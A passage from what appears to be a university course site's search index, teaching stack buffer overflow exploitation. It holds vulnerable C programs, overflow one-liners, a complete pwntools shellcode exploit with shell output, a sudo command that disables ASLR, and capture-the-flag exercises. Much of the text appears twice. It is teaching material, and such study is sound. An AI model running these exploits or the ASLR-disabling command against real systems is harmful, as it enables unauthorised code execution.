compiler chose to layout the stack like this: 0xffff006c: 0xf7f7f7f7 // Saved EIP 0xffff0068: 0xffff0100 // Saved EBP 0xffff0064: 0xdeadbeef // secret ... 0xffff0004: 0x0 ESP -> 0xffff0000: 0x0 // name let's look at what happens when we read in 0x100 bytes of 'A's. The first decimal 100 bytes are saved properly: 0xffff006c: 0xf7f7f7f7 // Saved EIP 0xffff0068: 0xffff0100 // Saved EBP 0xffff0064: 0xdeadbeef // secret ... 0xffff0004: 0x41414141 ESP -> 0xffff0000: 0x41414141 // name However when the 101st byte is read in, we see an issue: 0xffff006c: 0xf7f7f7f7 // Saved EIP 0xffff0068: 0xffff0100 // Saved EBP 0xffff0064: 0xdeadbe41 // secret ... 0xffff0004: 0x41414141 ESP -> 0xffff0000: 0x41414141 // name The least significant byte of secret has been overwritten! If we follow the next 3 bytes to be read in, we'll see the entirety of secret is \"clobbered\" with our 'A's 0xffff006c: 0xf7f7f7f7 // Saved EIP 0xffff0068: 0xffff0100 // Saved EBP 0xffff0064: 0x41414141 // secret ... 0xffff0004: 0x41414141 ESP -> 0xffff0000: 0x41414141 // name The remaining 152 bytes would continue clobbering values up the stack. Passing an impossible check How can we use this to pass the seemingly impossible check in the original program? Well, if we carefully line up our input so that the bytes that overwrite secret happen to be the bytes that represent 0x1337 in little-endian, we'll see the secret message. A small Python one-liner will work nicely: python -c \"print 'A'*100 + '\\x31\\x13\\x00\\x00'\" This will fill the name buffer with 100 'A's, then overwrite secret with the 32-bit little-endian encoding of 0x1337. Going one step further As discussed on the stack page, the instruction that the current function should jump to when it is done is also saved on the stack (denoted as \"Saved EIP\" in the above stack diagrams). If we can overwrite this, we can control where the program jumps after main finishes running, giving us the ability to control what the program does entirely. Usually, the end objective in binary exploitation is to get a shell (often called \"popping a shell\") on the remote computer. The shell provides us with an easy way to run anything we want on the target computer. Say there happens to be a nice function that does this defined somewhere else in the program that we normally can't get to: void give_shell() { system(\"/bin/sh\"); } Well with our buffer overflow knowledge, now we can! All we have to do is overwrite the saved EIP on the stack to the address where give_shell is. Then, when main returns, it will pop that address off of the stack and jump to it, running give_shell , and giving us our shell. Assuming give_shell is at 0x08048fd0, we could use something like this: python -c \"print 'A'*108 + '\\xd0\\x8f\\x04\\x08'\" We send 108 'A's to overwrite the 100 bytes that is allocated for name , the 4 bytes for secret , and the 4 bytes for the saved EBP. Then we simply send the little-endian form of give_shell 's address, and we would get a shell! This idea is extended on in Return Oriented Programming. Overwrite values on stack For example, we are given the following code in C language: #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main(int argc, char **argv) { volatile int modified; char buffer[64]; if(argc == 1) { errx(1, \"please specify an argument\\n\"); } modified = 0; strcpy(buffer, argv[1]); if(modified == 0x61626364) { printf(\"you have correctly got the variable to the right value\\n\"); } else { printf(\"Try again, you got 0x%08x\\n\", modified); } } Breakdown So this code : creates a variable called \u201cmodified\u201d and assigns a buffer of 64 chars to it. volatile int modified; char buffer[64]; Checks if we supplied an argument or not. if(argc == 1) { errx(1, \"please specify an argument\\n\"); } Sets the value of the \u201cmodified\u201d variable into 0 , then it copies whatever we give it argv[1] into the buffer of \u201cmodified\u201d. modified = 0; strcpy(buffer, argv[1]); Then it checks if the variable\u2019s value is 0x61626364 or not if(modified == 0x61626364) { printf(\"you have correctly got the variable to the right value\\n\"); } else { printf(\"Try again, you got 0x%08x\\n\", modified); } Solution So it\u2019s similar to Stack0 except we need to set the value of the variable into a specific value which is 0x61626364 in this case. This is the hexadecimal value of \u201cdcba\u201d now keep in mind that when reading hex you read it from right to left not left to right. To slove this our input will be 64 chars then after that the value , let\u2019s try it. Let\u2019s execute stack1 We get please specify an argument so let\u2019s enter anything. We get try again you got 0x00000000 , Let\u2019s try to change that by exceeding the buffer and entering any char for example \u201cb\u201d ./stack1 `python -c \"print ('A' * 64 + 'b')\"` And we see that the value changed to 0x00000062 which is the hex value of \u201cb\u201d so our exploit is working, Let\u2019s apply that. ./stack1 `python -c \"print ('A' * 64 + 'dcba')\"` And we did it ! But can we do it in another way ? instead of entering ASCII we can use the hex values and python will translate them. ./stack1 `python -c \"print('A' * 64 + '\\x64\\x63\\x62\\x61')\"` Shellcode In real exploits, it's not particularly likely that you will have a win() function lying around - shellcode is a way to run your own instructions, giving you the ability to run arbitrary commands on the system. Shellcode is essentially assembly instructions , except we input them into the binary; once we input it, we overwrite the return pointer to hijack code execution and point at our own instructions! I promise you can trust me but you should never ever run shellcode without knowing what it does. Pwntools is safe and has almost all the shellcode you will ever need. The reason shellcode is successful is that Von Neumann architecture (the architecture used in most computers today) does not differentiate between data and instructions - it doesn't matter where or what you tell it to run, it will attempt to run it. Therefore, even though our input is data, the computer doesn't know that - and we can use that to our advantage. Shellcodeshellcode.zip - 3KB Disabling ASLR ASLR is a security technique, and while it is not specifically designed to combat shellcode, it involves randomising certain aspects of memory (we will talk about it in much more detail later). This randomisation can make shellcode exploits like the one we're about to do more less reliable, so we'll be disabling it for now using this . echo 0 | sudo tee /proc/sys/kernel/randomize_va_space Again, you should never run commands if you don't know what they do Finding the Buffer in Memory Let's debug vuln() using radare2 and work out where in memory the buffer starts; this is where we want to point the return pointer to. $ r2 -d -A vuln [0xf7fd40b0]> s sym.unsafe ; pdf[...]; var int32_t var_134h @ ebp-0x134[...] This value that gets printed out is a local variable - due to its size, it's fairly likely to be the buffer. Let's set a breakpoint just after gets() and find the exact address. [0x08049172]> dcOverflow me<<Found me>> <== This was my inputhit breakpoint at: 80491a8[0x080491a8]> px @ ebp - 0x134- offset - 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF0xffffcfb4 3c3c 466f 756e 6420 6d65 3e3e 00d1 fcf7 <<Found me>>.... [...] It appears to be at 0xffffcfd4 ; if we run the binary multiple times, it should remain where it is (if it doesn't, make sure ASLR is disabled!). Finding the Padding Now we need to calculate the padding until the return pointer. We'll use the De Bruijn sequence as explained in the previous blog post. $ ragg2 -P 400 -r<copy this> $ r2 -d -A vuln[0xf7fd40b0]> dcOverflow me<<paste here>>[0x73424172]> wopO `dr eip`312 The padding is 312 bytes. Putting it all together In order for the shellcode to be correct, we're going to set context.binary to our binary; this grabs stuff like the arch, OS and bits and enables pwntools to provide us with working shellcode. from pwn import * context.binary = ELF('./vuln') p = process() We can use just process() because once context.binary is set it is assumed to use that process Now we can use pwntools' awesome shellcode functionality to make it incredibly simple. payload = asm(shellcraft.sh()) # The shellcode payload = payload.ljust(312, b'A') # Padding payload += p32(0xffffcfb4) # Address of the Shellcode Yup, that's it. Now let's send it off and use p.interactive() , which enables us to communicate to the shell. log.info(p.clean()) p.sendline(payload) p.interactive() If you're getting an EOFError , print out the shellcode and try to find it in memory - the stack address may be wrong $ python3 exploit.py [*] 'vuln' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments [+] Starting local process 'vuln': pid 3606 [*] Overflow me [*] Switching to interactive mode $ whoami ironstone $ ls exploit.py source.c vuln And it works! Awesome. Final Exploit from pwn import * context.binary = ELF('./vuln') p = process() payload = asm(shellcraft.sh()) # The shellcodepayload = payload.ljust(312, b'A') # Paddingpayload += p32(0xffffcfb4) # Address of the Shellcode log.info(p.clean()) p.sendline(payload) p.interactive() Find Shellcode Online There are some online resources for shellcode. Sometimes the program runs input check that some characters are filtered. Using online database or pwntool's shellcode generator are both fine. Shellcode database: http://shell-storm.org/shellcode/ According to the different CPU architecture and operating system, you may need different shellcode. Exercise (5 pt) Smash the stack After three days of staying up to finish deadline, you feel extremely tired. Wanna to buy some coffee, you step out room and walking to the store. Tired, exhausted, and thinking about the difficult challenge, without seeing the truck that rushing directly to you... When light appears, a goddess whos so beautiful standing in front of you, said, \"Now, you are selected to re-born in the fantasy world.\" \"Help us to fight dragon the world destroyer, and save this world plz!\" Said the goddess. \"You have ONE chance to make a vow, and I'll make it true.\" \"By the way, if you put something that I can't handle, I'll give you a flag !\" nc ali.infury.org 10001 goddess goddess.c Hack the goddess and find flag. Flag format: flag{***} (5 pt) Check and overlap Because of the goddess got stuck when processing, so you finally didn't get any special power. After fighting for days, you reach the \"end castle\" and ready to terminate \"dragon the destroyer\" by yourself. \"You, a mere human. How dare you to challenge me!\" Said the dragon, who has indestructible scale and powerful skin that resists to all magic. \"Only using the ancient legendary weapons that you can hurt me. However, those powers are unreachable and you can't assign value to them .\" \"Now, what's your last word?\" nc ali.infury.org 10002 dragon dragon.c Fight the dragon and find flag. Flag format: flag{***} (BONUS 5 pt) Perfectly secure from shellcode The dragon fell down into dust. You become the hero of the fantasy world. However, you still want to return home. \"Only the God can leave this world.\" Said the wiser, \"that dragon is the most powerful creature and the most close to the God. Maybe... Only maybe... There is only one way.\" \"Grab the dragon's egg, use it to caste the most powerful wish magic. You have a chance to say something to the world tree.\" \"However, you may only use characters no smaller than 32, no larger than 126 in ASCII order. May the bless be with you!\" The end of journey is arriving. You are filled with determination. nc ali.infury.org 10003 world world.c Become the God and find the flag. Flag format: flag{***}","title":"Week 2 PWN: Basic Buffer Overflow"},{"location":"CS315/Week%202/#week-2-pwn-basic-buffer-overflow","text":"","title":"Week 2 PWN: Basic Buffer Overflow"},{"location":"CS315/Week%202/#binary-exploitation","text":"Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions. Common topics addressed by Binary Exploitation or 'pwn' challenges include: Registers The Stack Calling Conventions Global Offset Table (GOT) Buffers Buffer Overflow Return Oriented Programming (ROP) Binary Security No eXecute (NX) Address Space Layout Randomization (ASLR) Stack Canaries Relocation Read-Only (RELRO) The Heap Heap Exploitation Format String Vulnerability","title":"Binary Exploitation"},{"location":"CS315/Week%202/#buffers","text":"A buffer is any allocated space in memory where data (often user input) can be stored. For example, in the following C program name would be considered a stack buffer: #include <stdio.h> int main() { char name[64] = {0}; read(0, name, 63); printf(\"Hello %s\", name); return 0; } Buffers could also be global variables: #include <stdio.h> char name[64] = {0}; int main() { read(0, name, 63); printf(\"Hello %s\", name); return 0; } Or dynamically allocated on the heap: #include <stdio.h> #include <stdlib.h> int main() { char *name = malloc(64); memset(name, 0, 64); read(0, name, 63); printf(\"Hello %s\", name); return 0; }","title":"Buffers"},{"location":"CS315/Week%202/#exploits","text":"Given that buffers commonly hold user input, mistakes when writing to them could result in attacker controlled data being written outside of the buffer's space.","title":"Exploits"},{"location":"CS315/Week%202/#introduction-to-stack","text":"A stack is an abstract data type frequently used in computer science. It has a property that the Last item placed will be the first to be removed from it ( LIFO ) . Several options are defined on the stack , the most important ones are push and pop . push add an element to the top of the stack , and pop removes elements from the top . /* The address of memory which is pointed by the Stack Pointer ( sp ) is the top of the stack */ \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 <\u2500 sp \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 : push 0x10 /* sp is incremented and the value is stored at that address */ \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 0x10 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 <\u2500 sp : push 0x20 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 0x10 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 0x20 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 <\u2500 sp : pop var /* The value pointed by the sp is removed from the stack and sp is decremented */ \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 0x10 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 <\u2500 sp Modern computers are designed with the need of high-level languages in mind. The most important technique for structuring programs introduced by high-level languages is the function. From one point of view, a function call alters the flow of control just as a jump does, but unlike a jump, when finished performing its task, a function returns control to the statement or instruction following the call. This high-level abstraction is implemented with the help of the stack. The stack is also used to allocate local variables , to pass parameters to the functions, and to store the information needed to return to caller function after the execution of the function gets over. The stack pointer is a special register which will always point to the top of the stack , in x86-32 bit this register is called esp .The area allocated on the stack for a function is called it's stack frame . and the registers ebp and esp (in x86-32 bit system )are used to specify the boundaries of the stack frame . The ebp will point to the staring of the stack frame of the current function and the esp register will point to the bottom.","title":"Introduction to Stack"},{"location":"CS315/Week%202/#buffer-overflow","text":"A Buffer Overflow is a vulnerability in which data can be written which exceeds the allocated space, allowing an attacker to overwrite other data.","title":"Buffer Overflow"},{"location":"CS315/Week%202/#stack-buffer-overflow","text":"The simplest and most common buffer overflow is one where the buffer is on the stack. Let's look at an example. #include <stdio.h> int main() { int secret = 0xdeadbeef; char name[100] = {0}; read(0, name, 0x100); if (secret == 0x1337) { puts(\"Wow! Here's a secret.\"); } else { puts(\"I guess you're not cool enough to see my secret\"); } } There's a tiny mistake in this program which will allow us to see the secret. name is decimal 100 bytes, however we're reading in hex 100 bytes (=256 decimal bytes)! Let's see how we can use this to our advantage. If the compiler chose to layout the stack like this: 0xffff006c: 0xf7f7f7f7 // Saved EIP 0xffff0068: 0xffff0100 // Saved EBP 0xffff0064: 0xdeadbeef // secret ... 0xffff0004: 0x0 ESP -> 0xffff0000: 0x0 // name let's look at what happens when we read in 0x100 bytes of 'A's. The first decimal 100 bytes are saved properly: 0xffff006c: 0xf7f7f7f7 // Saved EIP 0xffff0068: 0xffff0100 // Saved EBP 0xffff0064: 0xdeadbeef // secret ... 0xffff0004: 0x41414141 ESP -> 0xffff0000: 0x41414141 // name However when the 101st byte is read in, we see an issue: 0xffff006c: 0xf7f7f7f7 // Saved EIP 0xffff0068: 0xffff0100 // Saved EBP 0xffff0064: 0xdeadbe41 // secret ... 0xffff0004: 0x41414141 ESP -> 0xffff0000: 0x41414141 // name The least significant byte of secret has been overwritten! If we follow the next 3 bytes to be read in, we'll see the entirety of secret is \"clobbered\" with our 'A's 0xffff006c: 0xf7f7f7f7 // Saved EIP 0xffff0068: 0xffff0100 // Saved EBP 0xffff0064: 0x41414141 // secret ... 0xffff0004: 0x41414141 ESP -> 0xffff0000: 0x41414141 // name The remaining 152 bytes would continue clobbering values up the stack.","title":"Stack buffer overflow"},{"location":"CS315/Week%202/#passing-an-impossible-check","text":"How can we use this to pass the seemingly impossible check in the original program? Well, if we carefully line up our input so that the bytes that overwrite secret happen to be the bytes that represent 0x1337 in little-endian, we'll see the secret message. A small Python one-liner will work nicely: python -c \"print 'A'*100 + '\\x31\\x13\\x00\\x00'\" This will fill the name buffer with 100 'A's, then overwrite secret with the 32-bit little-endian encoding of 0x1337.","title":"Passing an impossible check"},{"location":"CS315/Week%202/#going-one-step-further","text":"As discussed on the stack page, the instruction that the current function should jump to when it is done is also saved on the stack (denoted as \"Saved EIP\" in the above stack diagrams). If we can overwrite this, we can control where the program jumps after main finishes running, giving us the ability to control what the program does entirely. Usually, the end objective in binary exploitation is to get a shell (often called \"popping a shell\") on the remote computer. The shell provides us with an easy way to run anything we want on the target computer. Say there happens to be a nice function that does this defined somewhere else in the program that we normally can't get to: void give_shell() { system(\"/bin/sh\"); } Well with our buffer overflow knowledge, now we can! All we have to do is overwrite the saved EIP on the stack to the address where give_shell is. Then, when main returns, it will pop that address off of the stack and jump to it, running give_shell , and giving us our shell. Assuming give_shell is at 0x08048fd0, we could use something like this: python -c \"print 'A'*108 + '\\xd0\\x8f\\x04\\x08'\" We send 108 'A's to overwrite the 100 bytes that is allocated for name , the 4 bytes for secret , and the 4 bytes for the saved EBP. Then we simply send the little-endian form of give_shell 's address, and we would get a shell! This idea is extended on in Return Oriented Programming.","title":"Going one step further"},{"location":"CS315/Week%202/#overwrite-values-on-stack","text":"For example, we are given the following code in C language: #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main(int argc, char **argv) { volatile int modified; char buffer[64]; if(argc == 1) { errx(1, \"please specify an argument\\n\"); } modified = 0; strcpy(buffer, argv[1]); if(modified == 0x61626364) { printf(\"you have correctly got the variable to the right value\\n\"); } else { printf(\"Try again, you got 0x%08x\\n\", modified); } }","title":"Overwrite values on stack"},{"location":"CS315/Week%202/#breakdown","text":"So this code : creates a variable called \u201cmodified\u201d and assigns a buffer of 64 chars to it. volatile int modified; char buffer[64]; Checks if we supplied an argument or not. if(argc == 1) { errx(1, \"please specify an argument\\n\"); } Sets the value of the \u201cmodified\u201d variable into 0 , then it copies whatever we give it argv[1] into the buffer of \u201cmodified\u201d. modified = 0; strcpy(buffer, argv[1]); Then it checks if the variable\u2019s value is 0x61626364 or not if(modified == 0x61626364) { printf(\"you have correctly got the variable to the right value\\n\"); } else { printf(\"Try again, you got 0x%08x\\n\", modified); }","title":"Breakdown"},{"location":"CS315/Week%202/#solution","text":"So it\u2019s similar to Stack0 except we need to set the value of the variable into a specific value which is 0x61626364 in this case. This is the hexadecimal value of \u201cdcba\u201d now keep in mind that when reading hex you read it from right to left not left to right. To slove this our input will be 64 chars then after that the value , let\u2019s try it. Let\u2019s execute stack1 We get please specify an argument so let\u2019s enter anything. We get try again you got 0x00000000 , Let\u2019s try to change that by exceeding the buffer and entering any char for example \u201cb\u201d ./stack1 `python -c \"print ('A' * 64 + 'b')\"` And we see that the value changed to 0x00000062 which is the hex value of \u201cb\u201d so our exploit is working, Let\u2019s apply that. ./stack1 `python -c \"print ('A' * 64 + 'dcba')\"` And we did it ! But can we do it in another way ? instead of entering ASCII we can use the hex values and python will translate them. ./stack1 `python -c \"print('A' * 64 + '\\x64\\x63\\x62\\x61')\"`","title":"Solution"},{"location":"CS315/Week%202/#shellcode","text":"In real exploits, it's not particularly likely that you will have a win() function lying around - shellcode is a way to run your own instructions, giving you the ability to run arbitrary commands on the system. Shellcode is essentially assembly instructions , except we input them into the binary; once we input it, we overwrite the return pointer to hijack code execution and point at our own instructions! I promise you can trust me but you should never ever run shellcode without knowing what it does. Pwntools is safe and has almost all the shellcode you will ever need. The reason shellcode is successful is that Von Neumann architecture (the architecture used in most computers today) does not differentiate between data and instructions - it doesn't matter where or what you tell it to run, it will attempt to run it. Therefore, even though our input is data, the computer doesn't know that - and we can use that to our advantage. Shellcodeshellcode.zip - 3KB","title":"Shellcode"},{"location":"CS315/Week%202/#disabling-aslr","text":"ASLR is a security technique, and while it is not specifically designed to combat shellcode, it involves randomising certain aspects of memory (we will talk about it in much more detail later). This randomisation can make shellcode exploits like the one we're about to do more less reliable, so we'll be disabling it for now using this . echo 0 | sudo tee /proc/sys/kernel/randomize_va_space Again, you should never run commands if you don't know what they do","title":"Disabling ASLR"},{"location":"CS315/Week%202/#finding-the-buffer-in-memory","text":"Let's debug vuln() using radare2 and work out where in memory the buffer starts; this is where we want to point the return pointer to. $ r2 -d -A vuln [0xf7fd40b0]> s sym.unsafe ; pdf[...]; var int32_t var_134h @ ebp-0x134[...] This value that gets printed out is a local variable - due to its size, it's fairly likely to be the buffer. Let's set a breakpoint just after gets() and find the exact address. [0x08049172]> dcOverflow me<<Found me>> <== This was my inputhit breakpoint at: 80491a8[0x080491a8]> px @ ebp - 0x134- offset - 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF0xffffcfb4 3c3c 466f 756e 6420 6d65 3e3e 00d1 fcf7 <<Found me>>.... [...] It appears to be at 0xffffcfd4 ; if we run the binary multiple times, it should remain where it is (if it doesn't, make sure ASLR is disabled!).","title":"Finding the Buffer in Memory"},{"location":"CS315/Week%202/#finding-the-padding","text":"Now we need to calculate the padding until the return pointer. We'll use the De Bruijn sequence as explained in the previous blog post. $ ragg2 -P 400 -r<copy this> $ r2 -d -A vuln[0xf7fd40b0]> dcOverflow me<<paste here>>[0x73424172]> wopO `dr eip`312 The padding is 312 bytes.","title":"Finding the Padding"},{"location":"CS315/Week%202/#putting-it-all-together","text":"In order for the shellcode to be correct, we're going to set context.binary to our binary; this grabs stuff like the arch, OS and bits and enables pwntools to provide us with working shellcode. from pwn import * context.binary = ELF('./vuln') p = process() We can use just process() because once context.binary is set it is assumed to use that process Now we can use pwntools' awesome shellcode functionality to make it incredibly simple. payload = asm(shellcraft.sh()) # The shellcode payload = payload.ljust(312, b'A') # Padding payload += p32(0xffffcfb4) # Address of the Shellcode Yup, that's it. Now let's send it off and use p.interactive() , which enables us to communicate to the shell. log.info(p.clean()) p.sendline(payload) p.interactive() If you're getting an EOFError , print out the shellcode and try to find it in memory - the stack address may be wrong $ python3 exploit.py [*] 'vuln' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments [+] Starting local process 'vuln': pid 3606 [*] Overflow me [*] Switching to interactive mode $ whoami ironstone $ ls exploit.py source.c vuln And it works! Awesome.","title":"Putting it all together"},{"location":"CS315/Week%202/#final-exploit","text":"from pwn import * context.binary = ELF('./vuln') p = process() payload = asm(shellcraft.sh()) # The shellcodepayload = payload.ljust(312, b'A') # Paddingpayload += p32(0xffffcfb4) # Address of the Shellcode log.info(p.clean()) p.sendline(payload) p.interactive()","title":"Final Exploit"},{"location":"CS315/Week%202/#find-shellcode-online","text":"There are some online resources for shellcode. Sometimes the program runs input check that some characters are filtered. Using online database or pwntool's shellcode generator are both fine. Shellcode database: http://shell-storm.org/shellcode/ According to the different CPU architecture and operating system, you may need different shellcode.","title":"Find Shellcode Online"},{"location":"CS315/Week%202/#exercise","text":"","title":"Exercise"},{"location":"CS315/Week%202/#5-pt-smash-the-stack","text":"After three days of staying up to finish deadline, you feel extremely tired. Wanna to buy some coffee, you step out room and walking to the store. Tired, exhausted, and thinking about the difficult challenge, without seeing the truck that rushing directly to you... When light appears, a goddess whos so beautiful standing in front of you, said, \"Now, you are selected to re-born in the fantasy world.\" \"Help us to fight dragon the world destroyer, and save this world plz!\" Said the goddess. \"You have ONE chance to make a vow, and I'll make it true.\" \"By the way, if you put something that I can't handle, I'll give you a flag !\" nc ali.infury.org 10001 goddess goddess.c Hack the goddess and find flag. Flag format: flag{***}","title":"(5 pt) Smash the stack"},{"location":"CS315/Week%202/#5-pt-check-and-overlap","text":"Because of the goddess got stuck when processing, so you finally didn't get any special power. After fighting for days, you reach the \"end castle\" and ready to terminate \"dragon the destroyer\" by yourself. \"You, a mere human. How dare you to challenge me!\" Said the dragon, who has indestructible scale and powerful skin that resists to all magic. \"Only using the ancient legendary weapons that you can hurt me. However, those powers are unreachable and you can't assign value to them .\" \"Now, what's your last word?\" nc ali.infury.org 10002 dragon dragon.c Fight the dragon and find flag. Flag format: flag{***}","title":"(5 pt) Check and overlap"},{"location":"CS315/Week%202/#bonus-5-pt-perfectly-secure-from-shellcode","text":"The dragon fell down into dust. You become the hero of the fantasy world. However, you still want to return home. \"Only the God can leave this world.\" Said the wiser, \"that dragon is the most powerful creature and the most close to the God. Maybe... Only maybe... There is only one way.\" \"Grab the dragon's egg, use it to caste the most powerful wish magic. You have a chance to say something to the world tree.\" \"However, you may only use characters no smaller than 32, no larger than 126 in ASCII order. May the bless be with you!\" The end of journey is arriving. You are filled with determination. nc ali.infury.org 10003 world world.c Become the God and find the flag. Flag format: flag{***}","title":"(BONUS 5 pt) Perfectly secure from shellcode"},{"location":"CS315/Week%203/","text":"Week3 PWN: Advanced Buffer Overflow Binary Exploitation Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions. Common topics addressed by Binary Exploitation or 'pwn' challenges include: Registers The Stack Calling Conventions Global Offset Table (GOT) Buffers Buffer Overflow Return Oriented Programming (ROP) Binary Security No eXecute (NX) Address Space Layout Randomization (ASLR) Stack Canaries Relocation Read-Only (RELRO) The Heap Heap Exploitation Format String Vulnerability The Stack In computer architecture, the stack is a hardware manifestation of the stack data structure (a Last In, First Out queue). In x86, the stack is simply an area in RAM that was chosen to be the stack - there is no special hardware to store stack contents. The esp / rsp register holds the address in memory where the bottom of the stack resides. When something is push ed to the stack, esp decrements by 4 (or 8 on 64-bit x86), and the value that was push ed is stored at that location in memory. Likewise, when a pop instruction is executed, the value at esp is retrieved (i.e. esp is dereferenced), and esp is then incremented by 4 (or 8). N.B. The stack \"grows\" down to lower memory addresses! Conventionally, ebp / rbp contains the address of the top of the current stack frame , and so sometimes local variables are referenced as an offset relative to ebp rather than an offset to esp . A stack frame is essentially just the space used on the stack by a given function. Uses The stack is primarily used for a few things: Storing function arguments Storing local variables Storing processor state between function calls Example Let's see what the stack looks like right after say_hi has been called in this 32-bit x86 C program: #include <stdio.h> void say_hi(const char * name) { printf(\"Hello %s!\\n\", name); } int main(int argc, char ** argv) { char * name; if (argc != 2) { return 1; } name = argv[1]; say_hi(name); return 0; } And the relevant assembly: 0804840b <say_hi>: 804840b: 55 push ebp 804840c: 89 e5 mov ebp,esp 804840e: 83 ec 08 sub esp,0x8 8048411: 83 ec 08 sub esp,0x8 8048414: ff 75 08 push DWORD PTR [ebp+0x8] 8048417: 68 f0 84 04 08 push 0x80484f0 804841c: e8 bf fe ff ff call 80482e0 <printf@plt> 8048421: 83 c4 10 add esp,0x10 8048424: 90 nop 8048425: c9 leave 8048426: c3 ret 08048427 <main>: 8048427: 8d 4c 24 04 lea ecx,[esp+0x4] 804842b: 83 e4 f0 and esp,0xfffffff0 804842e: ff 71 fc push DWORD PTR [ecx-0x4] 8048431: 55 push ebp 8048432: 89 e5 mov ebp,esp 8048434: 51 push ecx 8048435: 83 ec 14 sub esp,0x14 8048438: 89 c8 mov eax,ecx 804843a: 83 38 02 cmp DWORD PTR [eax],0x2 804843d: 74 07 je 8048446 <main+0x1f> 804843f: b8 01 00 00 00 mov eax,0x1 8048444: eb 1c jmp 8048462 <main+0x3b> 8048446: 8b 40 04 mov eax,DWORD PTR [eax+0x4] 8048449: 8b 40 04 mov eax,DWORD PTR [eax+0x4] 804844c: 89 45 f4 mov DWORD PTR [ebp-0xc],eax 804844f: 83 ec 0c sub esp,0xc 8048452: ff 75 f4 push DWORD PTR [ebp-0xc] 8048455: e8 b1 ff ff ff call 804840b <say_hi> 804845a: 83 c4 10 add esp,0x10 804845d: b8 00 00 00 00 mov eax,0x0 8048462: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 8048465: c9 leave 8048466: 8d 61 fc lea esp,[ecx-0x4] 8048469: c3 ret Skipping over the bulk of main , you'll see that at 0x8048452 main 's name local is pushed to the stack because it's the first argument to say_hi . Then, a call instruction is executed. call instructions first push the current instruction pointer to the stack, then jump to their destination. So when the processor begins executing say_hi at 0x0804840b , the stack looks like this: EIP = 0x0804840b (push ebp) ESP = 0xffff0000 EBP = 0xffff002c 0xffff0004: 0xffffa0a0 // say_hi argument 1 ESP -> 0xffff0000: 0x0804845a // Return address for say_hi The first thing say_hi does is save the current ebp so that when it returns, ebp is back where main expects it to be. The stack now looks like this: EIP = 0x0804840c (mov ebp, esp) ESP = 0xfffefffc EBP = 0xffff002c 0xffff0004: 0xffffa0a0 // say_hi argument 1 0xffff0000: 0x0804845a // Return address for say_hi ESP -> 0xfffefffc: 0xffff002c // Saved EBP Again, note how esp gets smaller when values are pushed to the stack. Next, the current esp is saved into ebp , marking the top of the new stack frame. EIP = 0x0804840e (sub esp, 0x8) ESP = 0xfffefffc EBP = 0xfffefffc 0xffff0004: 0xffffa0a0 // say_hi argument 1 0xffff0000: 0x0804845a // Return address for say_hi ESP, EBP -> 0xfffefffc: 0xffff002c // Saved EBP Then, the stack is \"grown\" to accommodate local variables inside say_hi . EIP = 0x08048414 (push [ebp + 0x8]) ESP = 0xfffeffec EBP = 0xfffefffc 0xffff0004: 0xffffa0a0 // say_hi argument 1 0xffff0000: 0x0804845a // Return address for say_hi EBP -> 0xfffefffc: 0xffff002c // Saved EBP 0xfffefff8: UNDEFINED 0xfffefff4: UNDEFINED 0xfffefff0: UNDEFINED ESP -> 0xfffefffc: UNDEFINED NOTE: stack space is not implictly cleared! Now, the 2 arguments to printf are pushed in reverse order. EIP = 0x0804841c (call printf@plt) ESP = 0xfffeffe4 EBP = 0xfffefffc 0xffff0004: 0xffffa0a0 // say_hi argument 1 0xffff0000: 0x0804845a // Return address for say_hi EBP -> 0xfffefffc: 0xffff002c // Saved EBP 0xfffefff8: UNDEFINED 0xfffefff4: UNDEFINED 0xfffefff0: UNDEFINED 0xfffeffec: UNDEFINED 0xfffeffe8: 0xffffa0a0 // printf argument 2 ESP -> 0xfffeffe4: 0x080484f0 // printf argument 1 Finally, printf is called, which pushes the address of the next instruction to execute. EIP = 0x080482e0 ESP = 0xfffeffe4 EBP = 0xfffefffc 0xffff0004: 0xffffa0a0 // say_hi argument 1 0xffff0000: 0x0804845a // Return address for say_hi EBP -> 0xfffefffc: 0xffff002c // Saved EBP 0xfffefff8: UNDEFINED 0xfffefff4: UNDEFINED 0xfffefff0: UNDEFINED 0xfffeffec: UNDEFINED 0xfffeffe8: 0xffffa0a0 // printf argument 2 0xfffeffe4: 0x080484f0 // printf argument 1 ESP -> 0xfffeffe0: 0x08048421 // Return address for printf Once printf has returned, the leave instruction moves ebp into esp , and pops the saved EBP. EIP = 0x08048426 (ret) ESP = 0xfffefffc EBP = 